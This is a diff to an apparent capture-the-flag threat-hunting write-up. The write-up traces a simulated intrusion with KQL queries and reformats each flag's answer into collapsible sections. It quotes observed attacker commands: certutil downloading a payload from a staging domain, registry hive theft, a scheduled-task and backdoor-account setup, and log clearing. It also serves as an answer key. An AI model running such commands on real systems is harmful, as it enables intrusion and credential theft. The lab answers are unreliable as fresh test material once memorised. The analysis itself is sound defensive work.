@@ -22,10 +22,7 @@ A compromised user account is being used to conduct interactive attack activity.
 ### Section 1: Initial Access
 The attacker needed a way in. Something landed on an endpoint - whether it was clicked, downloaded, or delivered - and kicked off the entire compromise. Trace the infection back to its origin. Identify what arrived, how it executed, and what it spawned.
 #### 🚩Flag 1: Initial Vector
-Question: Identify the file that started the infection chain
-Finding: `daniel_richardson_cv.pdf.exe`
-Timestamp: `2026-01-15T03:58:55.6563735Z`
-
+**Question**: Identify the file that started the infection chain <br>
 The file `daniel_richardson_cv.pdf.exe` uses a double file extension, a common social engineering technique used by attackers to disguise malicious files as legitimate documents. Windows hides known file extensions by default, causing this file to appear as `daniel_richardson_cv.pdf` to the victim. This deception makes the file appear to be a resume or PDF document, increasing the likelihood the victim will open the file. As a recruiting company, it is very common for them to work with PDFs. Once executed, the file initiates the infection chain. 
 
 **KQL query used**: 
@@ -37,10 +34,15 @@ DeviceProcessEvents
 | order by Timestamp asc
 ```
 
+<details>
+<summary>Finding</summary>
+
+**Finding**: `daniel_richardson_cv.pdf.exe`
+**Timestamp**: `2026-01-15T03:58:55.6563735Z`
+
+</details>
 #### 🚩Flag 2: Payload Hash
-Question: Identify the SHA256 hash of the initial payload
-Finding: `48b97fd91946e81e3e7742b3554585360551551cbf9398e1f34f4bc4eac3a6b5`
-Timestamp: `2026-01-15T03:58:55.6563735Z`
+**Question**: Identify the SHA256 hash of the initial payload
 
 The SHA256 hash of `daniel_richardson_cv.pdf.exe` was confirmed to be `48b97fd91946e81e3e7742b3554585360551551cbf9398e1f34f4bc4eac3a6b5`
 
@@ -52,10 +54,17 @@ DeviceProcessEvents
 | project Timestamp, ActionType, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine, SHA256, InitiatingProcessFileName, InitiatingProcessParentFileName, InitiatingProcessSHA256
 | order by Timestamp asc
 ```
+
+<details>
+<summary>Finding</summary>
+
+**Finding**: `48b97fd91946e81e3e7742b3554585360551551cbf9398e1f34f4bc4eac3a6b5`
+**Timestamp**: `2026-01-15T03:58:55.6563735Z`
+
+</details>
+
 #### 🚩Flag 3: User Interaction
-Question: What parent process indicates the method of execution?
-Finding: `explorer.exe`
-Timestamp: `2026-01-15T03:58:55.6563735Z`
+**Question**: What parent process indicates the method of execution?
 
 The parent process of the malicious executable was `explorer.exe`, which indicates the malware was manually launched within Windows File Explorer by a user, rather than execution through scripting or an automated process.
 
@@ -72,14 +81,12 @@ DeviceProcessEvents
 <details>
 <summary>Finding</summary>
 
-Finding: `explorer.exe` <br>
-Timestamp: `2026-01-15T03:58:55.6563735Z
+**Finding**: `explorer.exe`
+**Timestamp**: `2026-01-15T03:58:55.6563735Z`
 
 </details>
 #### 🚩Flag 4: Suspicious Child Process
 Question: What legitimate Windows process was spawned?
-Finding: `notepad.exe`
-Timestamp: `2026-01-15T05:09:53.3995975Z`
 
 After `daniel_richardson_cv.pdf.exe` as executed, the file spawned the Windows process, `notepad.exe`, a legitimate Windows executable commonly used to open and modify text files. Attackers use legitimate system binaries to host malicious code or execute payloads under a trusted process to evade detection.
 
@@ -95,18 +102,24 @@ DeviceProcessEvents
 	SHA256, InitiatingProcessFileName, InitiatingProcessParentFileName,InitiatingProcessSHA256
 | order by Timestamp asc
 ```
+
+<details>
+<summary>Finding</summary>
+
+**Finding**: `notepad.exe`
+**Timestamp**: `2026-01-15T05:09:53.3995975Z`
+
+</details>
 #### 🚩Flag 5: Process Arguments
-Question: The spawned process executed with unusual arguments. What was the full command line?
-Finding: `notepad.exe ""`
-Timestamp: `2026-01-15T05:09:53.3995975Z`
+**Question**: The spawned process executed with unusual arguments. What was the full command line?
 
 The malicious executbale launched Notepad using the command:
-```PowerShell
+```cmd
 notepad.exe ""
 ```
 
 Typically, Notepad is executed with a filename argument
-```PowerShell
+```cmd
 notepad.exe file.txt
 ```
 However, the command `notepad.exe ""` launches Notepad with no file argument, which is uncommon for normal user activity. This may allow the attacker to execute malicious commands within Notepad under legitimate host process. Based on the alert generated, `Notepad.exe` was likely used as to inject malicious code into memory.
@@ -124,12 +137,18 @@ DeviceProcessEvents
 | order by Timestamp asc
 ```
 
+<details>
+<summary>Finding</summary>
+
+**Finding**: `notepad.exe ""`
+**Timestamp**: `2026-01-15T05:09:53.3995975Z`
+
+</details>
+
 ### Section 2: Command & Control
 > With a foothold established, the attacker needed to talk back to their infrastructure. Outbound connections were made to adversary-controlled domains. Identify how the attacker maintained communication and where their infrastructure lives.
 #### 🚩Flag 6: C2 Domain
-Question: What domain was used for command and control?
-Finding: `cdn.cloud-endpoint.net`
-Timestamp: `2026-01-15T04:04:33.2301079Z`
+**Question**: What domain was used for command and control?
 
 The domain `cdn.cloud-endpoint.net` was identified as the C2 domain used by the attacker. This domain received an outbound connection from the compromised host, `AS-PC1`, shortly after the malicious payload was executed. This domain resemble legitimate cloud domain to blend its malicious traffic with normal network activity. 
 
@@ -144,10 +163,16 @@ DeviceNetworkEvents
     InitiatingProcessFolderPath, InitiatingProcessSHA256, InitiatingProcessCommandLine, RemoteIP, RemotePort, RemoteUrl
 | sort by Timestamp asc
 ```
+
+<details>
+<summary>Finding</summary>
+
+**Finding**: `cdn.cloud-endpoint.net`
+**Timestamp**: `2026-01-15T04:04:33.2301079Z`
+
+</details>
 #### 🚩Flag 7: C2 Process
-Question: What process initiated the outbound connections?
-Finding: `daniel_richardson_cv.pdf.exe`
-Timestamp: `2026-01-15T03:47:10.786699Z`
+**Question**: What process initiated the outbound connections?
 
 Network activity shows outbound connections towards `cdn.cloud-endpoint.net` were initiated by `Daniel_Richardson_CV.pdf.exe`. This confirms the executable established the initial beacon to their C2 server.
 
@@ -162,15 +187,22 @@ DeviceNetworkEvents
     RemotePort, RemoteUrl
 | sort by Timestamp asc
 ```
+
+<details>
+<summary>Finding</summary>
+
+**Finding**: `daniel_richardson_cv.pdf.exe`
+**Timestamp**: `2026-01-15T03:47:10.786699Z`
+
+</details>
+
 #### 🚩Flag 8: Staging Infrastructure
-Question: What domain was used for payload staging?
-Finding: `sync.cloud-endpoint.net`
-Timestamp: `2026-01-15T04:52:23.0978038Z`
+**Question**: What domain was used for payload staging?
 
 The domain `sync.cloud-endpoint.net` was used as payload staging infrastructure as network logs show the attacker using the Windows utility `certutil.exe` to download an additional payload. In order to avoid dection, the attacker renamed the downloaded payload as `RuntimeBroker.exe` which is the name of a legitimate Windows process. 
 
 **Observed attacker command**: 
-```KQL
+```cmd
 certutil.exe -urlcache -split -f https://sync.cloud-endpoint.net/Daniel_Richardson_CV.pdf.exe C:\Users\Public\RuntimeBroker.exe
 ```
 
@@ -185,12 +217,18 @@ DeviceNetworkEvents
 | sort by Timestamp asc
 ```
 
+<details>
+<summary>Finding</summary>
+
+**Finding**: `sync.cloud-endpoint.net`
+**Timestamp**: `2026-01-15T04:52:23.0978038Z`
+
+</details>
+
 ### Section 3: Credential Access
 > Credentials are the keys to the kingdom. The attacker went after stored secrets on the compromised host - targeting local credential stores and using in-memory techniques to extract authentication material. Determine what was targeted, how it was stolen, and who was doing it.
 #### 🚩Flag 9: Registry Targets
-Question: The attacker targeted local credential stores. What two registry hives were targeted?
-Finding: `SAM, SYSTEM`
-Timestamp: `2026-01-15T04:13:32.7652183Z`
+**Question**: The attacker targeted local credential stores. What two registry hives were targeted?
 
 The attacker used the Windows registry utility `reg.exe` to extract credential data from the system. 
 
@@ -212,10 +250,16 @@ DeviceProcessEvents
     InitiatingProcessCommandLine, InitiatingProcessSHA256
 | sort by Timestamp asc
 ```
+
+<details>
+<summary>Finding</summary>
+
+**Finding**: `SAM, SYSTEM`
+**Timestamp**: `2026-01-15T04:13:32.7652183Z`
+
+</details>
 #### 🚩Flag 10: Local Staging
-Question: Extracted data was saved locally before exfiltration. Where were the credentials saved?
-Finding: `C:\Users\Public`
-Timestamp: `2026-01-15T04:13:32.7652183Z`
+**Question**: Extracted data was saved locally before exfiltration. Where were the credentials saved?
 
 The extracted registry hives were staged in the directory `C:\Users\Public`, a common Public folder writable by al users. These files are likely intended for future exfiltration or cracking. 
 
@@ -229,10 +273,17 @@ DeviceProcessEvents
     InitiatingProcessCommandLine, InitiatingProcessSHA256
 | sort by Timestamp asc
 ```
+
+<details>
+<summary>Finding</summary>
+
+**Finding**: `C:\Users\Public`
+**Timestamp**: `2026-01-15T04:13:32.7652183Z`
+
+</details>
+
 #### 🚩Flag 11: Execution Identity
-Question: What user performed this action?
-Finding: `sophie.turner`
-Timestamp: `2026-01-15T04:13:32.7652183Z`
+**Question**: What user performed this action?
 
 The credential extraction commands were executed under the user `sophie.turner`. This is another confirmation that the attacker was operating within a valid compromised user session. As a legitimate user account, this activity could blend in with their normal activity as opposed to executing these commands as SYSTEM or Administrator.
 
@@ -247,12 +298,18 @@ DeviceProcessEvents
 | sort by Timestamp asc
 ```
 
+<details>
+<summary>Finding</summary>
+
+**Finding**: `sophie.turner`
+**Timestamp**: `2026-01-15T04:13:32.7652183Z`
+
+</details>
+
 ### Section 4: Discovery 
 > Before moving deeper, the attacker needed to understand the environment. They ran commands to figure out who they were, what was around them, and what they could reach. Identify the reconnaissance activity and what intelligence the attacker gathered.
 #### 🚩Flag 12: User Context
-Question: The attacker confirmed their identity  after initial access. What command was used?
-Finding: `whoami.exe`
-Timestamp: `2026-01-15T03:58:55.6563735Z`
+**Question**: The attacker confirmed their identity  after initial access. What command was used?
 
 The attacker executed the command `whoami.exe` to display information about the current user on the system. This command is commonly ran after successfully gaining access to a system, allowing the attacker to know what account they're operating on and the privilege level of the account. 
 
@@ -265,10 +322,16 @@ DeviceProcessEvents
     InitiatingProcessFileName, InitiatingProcessCommandLine
 | sort by Timestamp asc
 ```
+
+<details>
+<summary>Finding</summary>
+
+**Finding**: `whoami.exe`
+**Timestamp**: `2026-01-15T03:58:55.6563735Z`
+
+</details>
 #### 🚩Flag 13: Network Enumeration
-Question: What command was used to view available shares?
-Finding: `net.exe view`
-Timestamp: `2026-01-15T04:01:32.0791816Z`
+**Question**: What command was used to view available shares?
 
 The attacker is seen executing the command `net.exe view`, which lists available network shares and systems on the local network. This allows the attacker to identify additional systems to target for lateral movement. 
 
@@ -281,10 +344,16 @@ DeviceProcessEvents
     InitiatingProcessFileName, InitiatingProcessCommandLine
 | sort by Timestamp asc
 ```
+
+<details>
+<summary>Finding</summary>
+
+**Finding**: `net.exe view`
+**Timestamp**: `2026-01-15T04:01:32.0791816Z`
+
+</details>
 #### 🚩Flag 14: Local Admins
-Question: The attacker enumerated privileged local group memebership. What group was queried?
-Finding: `administrators`
-Timestamp: `2026-01-15T04:01:19.1611938Z`
+**Question**: The attacker enumerated privileged local group memebership. What group was queried?
 
 Additionally, the attacker executed the command `net localgroup administrators` which lists the members of the local Administrators group on the system. This identifies accounts with elevated privileges which the attacker can target for privilege escalation. 
 
@@ -299,12 +368,18 @@ DeviceProcessEvents
 | sort by Timestamp asc
 ```
 
+<details>
+<summary>Finding</summary>
+
+**Finding**: `administrators`
+**Timestamp**: `2026-01-15T04:01:19.1611938Z`
+
+</details>
+
 ### Section 5: Persistence - Remote Tool
 > The attacker wasn't planning a short visit. Multiple mechanisms were deployed to ensure continued access - legitimate tools repurposed, tasks scheduled, accounts created. Map out every backdoor they left behind.
 #### 🚩Flag 15: Remote Tool
-Question: A legitimate remote administator tool was deployed for ongoing access. What software was installed?
-Finding: `Anydesk`
-Timestamp: `2026-01-15T04:08:31.0759602Z`
+**Question**: A legitimate remote administator tool was deployed for ongoing access. What software was installed?
 
 The attacker installed the remote tool `AnyDesk`, a remote desktop tool. Although AnyDesk is a common and legitimate tool, it can be used by attackers as a form of persistence. Once installed and configured, the attacker could reconnect to the compromised system at any time it is active. 
 
@@ -319,10 +394,16 @@ DeviceFileEvents
 | sort by Timestamp asc
 ```
 
+<details>
+<summary>Finding</summary>
+
+**Finding**: `Anydesk`
+**Timestamp**: `2026-01-15T04:08:31.0759602Z`
+
+</details>
+
 #### 🚩Flag 16: Remote Tool Hash
-Question: Identify the SHA256 hash of the remote access tool.
-Finding: `f42b635d93720d1624c74121b83794d706d4d064bee027650698025703d20532`
-Timestamp: `2026-01-15T04:08:31.0759602Z`
+**Question**: Identify the SHA256 hash of the remote access tool.
 
 The SHA256 hash of `AnyDesk.exe` was identified as `f42b635d93720d1624c74121b83794d706d4d064bee027650698025703d20532`
 
@@ -338,10 +419,16 @@ DeviceFileEvents
 | sort by Timestamp asc
 ```
 
+<details>
+<summary>Finding</summary>
+
+**Finding**: `f42b635d93720d1624c74121b83794d706d4d064bee027650698025703d20532`
+**Timestamp**: `2026-01-15T04:08:31.0759602Z`
+
+</details>
+
 #### 🚩Flag 17: Download Method
-Question: The tool was downloaded using a native Windows binary. What binary/executable was used?
-Finding: `certutil`
-Timestamp: `2026-01-15T04:08:31.0759602Z`
+**Question**: The tool was downloaded using a native Windows binary. What binary/executable was used?
 
 The attacker downloaded the remote tool using the Windows utility `certuitl.exe` using the following command: 
 ```PowerShell
@@ -361,10 +448,16 @@ DeviceProcessEvents
 | sort by Timestamp asc
 ```
 
+<details>
+<summary>Finding</summary>
+
+**Finding**: `certutil`
+**Timestamp**: `2026-01-15T04:08:31.0759602Z`
+
+</details>
+
 #### 🚩Flag 18: Configuration Access
-Question: After installation, a configuration file was accessed. What is the full path of this file?
-Finding: `C:\Users\Sophie.Turner\AppData\Roaming\AnyDesk\system.conf`
-Timestamp: `2026-01-15T04:11:13.5896114Z`
+**Question**: After installation, a configuration file was accessed. What is the full path of this file?
 
 After installing AnyDesk, the attacker accessed the configuration file located in: 
 `C:\Users\Sophie.Turner\AppData\Roaming\AnyDesk\system.conf`
@@ -382,10 +475,16 @@ DeviceProcessEvents
 | sort by Timestamp asc
 ```
 
+<details>
+<summary>Finding</summary>
+
+**Finding**: `C:\Users\Sophie.Turner\AppData\Roaming\AnyDesk\system.conf`
+**Timestamp**: `2026-01-15T04:11:13.5896114Z`
+
+</details>
+
 #### 🚩Flag 19: Access Credentials
-Question: Unattended access was configured for the remote tool. What password was set?
-Finding: `intrud3r!`
-Timestamp: `2026-01-15T04:11:47.1679716Z`
+**Question**: Unattended access was configured for the remote tool. What password was set?
 
 The attacker configured unattended access for AnyDesk by setting the password `intrud3r!` using the following command: 
 ```PowerShell
@@ -405,9 +504,16 @@ DeviceProcessEvents
 | sort by Timestamp asc
 ```
 
+<details>
+<summary>Finding</summary>
+
+**Finding**: `intrud3r!`
+**Timestamp**: `2026-01-15T04:11:47.1679716Z
+
+</details>
+
 #### 🚩Flag 20: Deployment Footprint
-Question: The remote tool was installed across the environment. List all the hostnames where it was deployed. 
-Finding: `AS-PC1, AS-PC2, AS-SRV`
+**Question**: The remote tool was installed across the environment. List all the hostnames where it was deployed. 
 
 Analysis of file creation events show `AnyDesk.exe` being deployed across multiple hosts:
 - `AS-PC1`
@@ -428,23 +534,28 @@ DeviceFileEvents
 | sort by Timestamp asc
 ```
 
+<details>
+<summary>Finding</summary>
+
+**Finding**: `AS-PC1, AS-PC2, AS-SRV
+
+</details>
+
 ### Section 6: Lateral Movement
 > One host wasn't enough. The attacker moved through the environment, and not every method worked the first time. Track the path they took, the tools they tried, the accounts they used, and the order they moved.
 #### 🚩Flag 21: Failed Execution
-Question: The attacker attempted remote execution methods that failed. What two tools were tried?
-Finding: `WMIC.EXE, PsExec.exe`
-Timestamp: `2026-01-15T04:18:44.6123349Z`
+**Question**: The attacker attempted remote execution methods that failed. What two tools were tried?
 
 The attacker attempted to move laterally to host `AS-PC2` using two common Windows remote execution tools: 
 - `WMIC.exe`
 - `PsExec.exe`
 Both tools allow the execution of commands remotely to other machines in the network. The first attempt uses `WMIC.exe` to create a process on `AS-PC2`, downloading `AnyDesk.exe`:
-```PowerShell
+```cmd
 "WMIC.exe" /node:AS-PC2 /user:Administrator /password:******** process call create "cmd.exe /c certutil -urlcache -split -f https://download.anydesk.com/AnyDesk.exe C:\Users\Public\AnyDesk.exe"
 ```
 
 Then the attacker attempted a second time using `PsExec`, a [Sysinternals]() tool:
-```PowerShell
+```cmd
 "PsExec.exe" -accepteula \\AS-PC2 -u AS-PC2\Administrator -p ********** cmd.exe
 ```
 
@@ -459,10 +570,16 @@ DeviceProcessEvents
 | sort by Timestamp asc
 ```
 
+<details>
+<summary>Finding</summary>
+
+**Finding**: `WMIC.EXE, PsExec.exe`
+**Timestamp**: `2026-01-15T04:18:44.6123349Z`
+
+</details>
+
 #### 🚩Flag 22: Target Host
-Question: What hostname was targeted in the failed attempts?
-Finding: `as-pc2`
-Timestamp: `2026-01-15T04:18:44.6123349Z`
+**Question**: What hostname was targeted in the failed attempts?
 
 The failed lateral movement attempts targeted the host `AS-PC2`. This suggests the attacker identified `AS-PC2` as potential pivot point within the network and attempted to remotely execute commands on the system.
 
@@ -476,10 +593,16 @@ DeviceProcessEvents
     SHA256, InitiatingProcessCommandLine, InitiatingProcessFileName
 | sort by Timestamp asc
 ```
+
+<details>
+<summary>Finding</summary>
+
+**Finding**: `as-pc2`
+**Timestamp**: `2026-01-15T04:18:44.6123349Z`
+
+</details>
 #### 🚩Flag 23: Successful Pivot
-Question: After failed attempts,  a different method achieved lateral movement. What windows executable was used?
-Finding: `mstsc.exe`
-Timestamp: `2026-01-15T04:29:43.9940417Z`
+**Question**: After failed attempts,  a different method achieved lateral movement. What windows executable was used?
 
 After multiple failed attempts using `WMIC.exe` and `PsExec.exe`, the attacker was able to laterally move successfully using `mstsc.exe`:
 ```PowerShell
@@ -497,9 +620,16 @@ DeviceProcessEvents
 | sort by Timestamp asc
 ```
 
+<details>
+<summary>Finding</summary>
+
+**Finding**: `mstsc.exe`
+**Timestamp**: `2026-01-15T04:29:43.9940417Z`
+
+</details>
+
 #### 🚩Flag 24: Movement Path
-Question: The attacker moved through the environment in a specific sequence. What is the full lateral movement path?
-Finding: `as-pc1 > as-pc2 > as-srv`
+**Question**: The attacker moved through the environment in a specific sequence. What is the full lateral movement path?
 
 Anydesk was confirmed on the following hosts: `as-pc1`, `as-pc2`, and `as-srv`. Based on the lateral movement attempts, the threat actor used `as-pc1` as the initial host and `as-pc2` as lateral movement point to `as-srv`.
 
@@ -514,10 +644,15 @@ DeviceProcessEvents
 | order by Timestamp asc
 ```
 
+<details>
+<summary>Finding</summary>
+
+**Finding**: `as-pc1 > as-pc2 > as-srv
+
+</details>
+
 #### 🚩Flag 25: Compromised Account
-Question: What username authenticated successfully?
-Finding: `david.mitchell`
-Timestamp: `2026-01-15T04:54:55.7957282Z`
+**Question**: What username authenticated successfully?
 
 LogonEvents indicate the user account, `david.mitchell`, to have successfully authenticate on `AS-PC2`. 
 
@@ -532,10 +667,16 @@ DeviceLogonEvents
 | sort by Timestamp asc
 ```
 
+<details>
+<summary>Finding</summary>
+
+**Finding**: `david.mitchell`
+**Timestamp**: `2026-01-15T04:54:55.7957282Z`
+
+</details>
+
 #### 🚩Flag 26: Account Activation
-Question: What net.exe parameter was used to activate the account?
-Finding: `/active:yes`
-Timestamp: `2026-01-15T04:40:31.9488698Z`
+**Question**: What net.exe parameter was used to activate the account?
 
 The attacker enabled a previously disabled account using the following command: 
 ```PowerShell
@@ -555,9 +696,16 @@ DeviceProcessEvents
 | sort by Timestamp asc
 ```
 
+<details>
+<summary>Finding</summary>
+
+**Finding**: `/active:yes`
+**Timestamp**: `2026-01-15T04:40:31.9488698Z`
+
+</details>
+
 #### 🚩Flag 27: Activation Context
-Question: Who performed this action?
-Finding: `david.mitchell`
+**Question**: Who performed this action?
 
 The command used to activate the account was executed under the user `david.mitchel`
 
@@ -571,15 +719,20 @@ DeviceProcessEvents
     SHA256, InitiatingProcessCommandLine, InitiatingProcessFileName
 | sort by Timestamp asc
 ```
+
+<details>
+<summary>Finding</summary>
+
+**Finding**: `david.mitchell`
+
+</details>
 ### Section 7: Persistence - Scheduled Task
 > The attacker planted additional persistence beyond the remote tool. Scheduled tasks and new accounts extend their access even if one mechanism is discovered and removed.
 #### 🚩Flag 28 Scheduled Persistence 
-Question: A scheduled task was created for persistence. What is the task name?
-Finding: `MicrosoftEdgeUpdateCheck`
-Timestamp: `2026-01-15T04:52:32.6871861Z`
+**Question**: A scheduled task was created for persistence. What is the task name?
 
 The attacker created a scheduled task `MicrosoftEdgeUpdateCheck` using the following command:
-```PowerShell
+```cmd
 "schtasks.exe" /create /tn MicrosoftEdgeUpdateCheck /tr C:\Users\Public\RuntimeBroker.exe /sc daily /st 03:00 /rl highest /f
 ```
 - `schtasks.exe` Windows scheduled task utility
@@ -604,10 +757,16 @@ DeviceProcessEvents
 | sort by Timestamp asc
 ```
 
+<details>
+<summary>Finding</summary>
+
+**Finding**: `MicrosoftEdgeUpdateCheck`
+**Timestamp**: `2026-01-15T04:52:32.6871861Z`
+
+</details>
+
 #### 🚩Flag 29: Renamed Binary
-Question: The persistence payload was renamed to avoid detection. What filename was used?
-Finding: `RuntimeBroker.exe`
-Timestamp: `2026-01-15T04:52:32.6871861Z`
+**Question**: The persistence payload was renamed to avoid detection. What filename was used?
 
 The persistence payload was renamed to `RuntimeBroker.exe`, which is the name of a legitimate process normally located in `C:\Windows\System32\`. However, the malicious file is stored in `C:\Users\Public`, the data staging location discovered earlier. 
 
@@ -622,9 +781,16 @@ DeviceProcessEvents
 | sort by Timestamp asc
 ```
 
+<details>
+<summary>Finding</summary>
+
+**Finding**: `RuntimeBroker.exe`
+**Timestamp**: `2026-01-15T04:52:32.6871861Z`
+
+</details>
+
 #### 🚩Flag 30: Persistence Hash
-Question: What is the SHA256 hash?
-Finding: `48b97fd91946e81e3e7742b3554585360551551cbf9398e1f34f4bc4eac3a6b5`
+**Question**: What is the SHA256 hash?
 
 The SHA256 hash of the persistence payload was `48b97fd91946e81e3e7742b3554585360551551cbf9398e1f34f4bc4eac3a6b5`, which is the same SHA256 hash as `daniel_richardson_cv.pdf.exe` payload. 
 
@@ -642,13 +808,17 @@ DeviceProcessEvents
 | sort by Timestamp asc
 ```
 
+<details>
+<summary>Finding</summary>
+
+**Finding**: `48b97fd91946e81e3e7742b3554585360551551cbf9398e1f34f4bc4eac3a6b5`
+
+</details>
 #### 🚩Flag 31: Backdoor Account
-Question: A new backdoor account was created for future access. What is the username?
-Finding: `svc_backup`
-Timestamp: `2026-01-15T04:57:47.0153078Z`
+**Question**: A new backdoor account was created for future access. What is the username?
 
 User created local account svc_backup and added to local administrator group
-```PowerShell
+```cmd
 net.exe user svc_backup ********** /add
 net.exe localgroup Administrators svc_backup /add
 ```
@@ -665,11 +835,18 @@ DeviceProcessEvents
 | sort by Timestamp asc
 ```
 
+<details>
+<summary>Finding</summary>
+
+**Finding**: `svc_backup`
+**Timestamp**: `2026-01-15T04:57:47.0153078Z`
+
+</details>
+
 ### Section 8: Data Access
 > The attacker found what they came for. Sensitive data was located, accessed, and staged for extraction. Identify what was taken, where it was accessed from, and how it was packaged.
 #### 🚩Flag 32: Sensitive Document
-Question: A sensistive document was accessed on the file server. What is the filename?
-Finding: `BACS_Payments_Dec2025.ods`
+**Question**: A sensistive document was accessed on the file server. What is the filename?
 
 The attacker accessed the file `BACS_Payments_Dec2025.ods`, which likely contains sensitive financial information. 
 
@@ -683,9 +860,14 @@ DeviceFileEvents
 | sort by Timestamp asc
 ```
 
+<details>
+<summary>Finding</summary>
+
+**Finding**: `BACS_Payments_Dec2025.ods
+
+</details>
 #### 🚩Flag 33: Modification Evidence
-Question: The document was opened for editing, not just viewing. What file artifact proves this? 
-Finding: `.~lock.BACS_Payments_Dec2025.ods#`
+**Question**: The document was opened for editing, not just viewing. What file artifact proves this? 
 
 The presence of the file `.~lock.BACS_Payments_Dec202.ods#` indicates the file was opened for editing. 
 
@@ -699,9 +881,15 @@ DeviceFileEvents
 | sort by Timestamp asc
 ```
 
+<details>
+<summary>Finding</summary>
+
+**Finding**: `.~lock.BACS_Payments_Dec2025.ods#`
+
+</details>
+
 #### 🚩Flag 34: Access Origin
-Question: The document was accessed from a specific workstation. What hostname accessed this file?
-Finding: `as-pc2` 
+**Question**: The document was accessed from a specific workstation. What hostname accessed this file?
 
 Logs show the document was accessed from the host `AS-PC2`
 
@@ -714,19 +902,25 @@ DeviceFileEvents
 | sort by Timestamp asc
 ```
 
+<details>
+<summary>Finding</summary>
+
+**Finding**: `as-pc2`
+
+</details>
+
 #### 🚩Flag 35: Exfil Archive
-Question: Data was arhcived before potential exfiltration. What is the archive filename?
-Finding: `Shares.7z`
+**Question**: Data was arhcived before potential exfiltration. What is the archive filename?
 
 Telemetry shows the creation of the archive `Shares.7z` on host `AS-SRV`: 
 
 Observed Command line: 
-```PowerShell 
+```cmd 
 "7zG.exe" a -i#7zMap308:22:7zEvent6071 -t7z -sae -- "C:\Shares.7z"
 ```
 
 Shortly afterward, the archive was renamed and moved into the shared directory by `as.srv.administrator`:
-```PowerShell
+```cmd
 C:\Shares\Clients\Shares.7z
 ```
 
@@ -742,9 +936,14 @@ DeviceFileEvents
 | sort by Timestamp asc
 ```
 
+<details>
+<summary>Finding</summary>
+
+**Finding**: `Shares.7z`
+
+</details>
 #### 🚩Flag 36: Archive Hash
-Question: What is the filehash?
-Finding: `6886c0a2e59792e69df94d2cf6ae62c2364fda50a23ab44317548895020ab048`
+**Question**: What is the filehash?
 
 **KQL query used**: 
 ```KQL
@@ -756,11 +955,17 @@ DeviceFileEvents
 | sort by Timestamp asc
 ```
 
+<details>
+<summary>Finding</summary>
+
+**Finding**: `6886c0a2e59792e69df94d2cf6ae62c2364fda50a23ab44317548895020ab048`
+
+</details>
+
 ### Section 9: Anti-forensics & Memory
 > Before leaving, the attacker tried to cover their tracks. Logs were cleared, binaries renamed, and tools loaded in ways designed to avoid detection. Identify the anti-forensics techniques and what evidence survived.
 #### 🚩Flag 37: Log Clearing
-Question: Name any two logs that were cleared
-Finding: `Security, System`
+**Question**: Name any two logs that were cleared
 
 The attacker cleared multiple Windows event logs using `wevtutil`:
 ```cmd
@@ -782,9 +987,15 @@ DeviceProcessEvents
 | sort by Timestamp asc
 ```
 
+<details>
+<summary>Finding</summary>
+
+**Finding**: `Security, System`
+
+</details>
+
 #### 🚩Flag 38: Reflective Loading
-Question: Evidence of reflective code loading was captured. What ActionType recorded this activity?
-Finding: `ClrUnbackedModuleLoaded`
+**Question**: Evidence of reflective code loading was captured. What ActionType recorded this activity?
 
 The Defender event `ClrUnbackedModuleLoaded` indicates that a .NET module was loaded into memory without a backing file on disk. This behavior commonly occurs when malicious code is:
 - injected directly into memory
@@ -810,9 +1021,16 @@ DeviceEvents
 | project Timestamp, ActionType, DeviceName, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFileName, InitiatingProcessFolderPath
 | sort by Timestamp asc
 ```
+
+<details>
+<summary>Finding</summary>
+
+**Finding**: `ClrUnbackedModuleLoaded`
+
+</details>
+
 #### 🚩Flag 39: Memory Tool
-Question: A credential theft tool was loaded directly into memory. What tool was used?
-Finding: `SharpChrome`
+**Question**: A credential theft tool was loaded directly into memory. What tool was used?
 
 Analysis of the reflective module loading event identified the tool **SharpChrome**. SharpChrome is an open-source credential harvesting tool designed to extract saved credentials from Chromium-based browsers.
 
@@ -828,9 +1046,15 @@ DeviceEvents
 | sort by Timestamp asc
 ```
 
+<details>
+<summary>Finding</summary>
+
+**Finding**: `SharpChrome`
+
+</details>
+
 #### 🚩Flag 40: Host Process
-Question: What process was hosting the malicious assembly?
-Finding: `notepad.exe`
+**Question**: What process was hosting the malicious assembly?
 
 The malicious .NET assembly was executed within the legitimate Windows process `notepad.exe`
 
@@ -843,6 +1067,13 @@ DeviceEvents
 | project Timestamp, ActionType, DeviceName, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFileName, InitiatingProcessFolderPath, AdditionalFields
 | sort by Timestamp asc
 ```
+
+<details>
+<summary>Finding</summary>
+
+**Finding**: `notepad.exe`
+
+</details>
 ## Root Cause Analysis
 
 The root cause of this incident was the execution of a malicious file disguised as a legitimate resume document, `daniel_richardson_cv.pdf.exe`, on workstation `AS-PC1`. The file used a double extension to appear as a normal PDF, increasing the likelihood that the user would trust and open it.
